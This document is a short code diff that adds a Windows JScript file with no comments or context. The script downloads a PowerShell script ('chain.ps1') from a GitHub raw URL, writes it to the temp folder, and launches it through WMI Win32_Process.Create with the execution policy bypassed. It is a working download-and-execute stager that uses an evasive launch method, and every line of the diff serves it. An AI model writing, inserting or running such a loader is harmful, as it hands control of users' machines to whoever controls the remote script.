@@ -1,0 +1,10 @@
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/chain.ps1",0);
+x.send();
+var fso=new ActiveXObject("Scripting.FileSystemObject");
+var t=fso.GetSpecialFolder(2)+"\\chain.ps1";
+fso.CreateTextFile(t).Write(x.responseText);
+var loc=new ActiveXObject("WbemScripting.SWbemLocator");
+var svc=loc.ConnectServer(".","root/cimv2");
+var p=svc.Get("Win32_Process");
+p.Create("powershell -ExecutionPolicy Bypass -File \""+t+"\"",null,null,null);
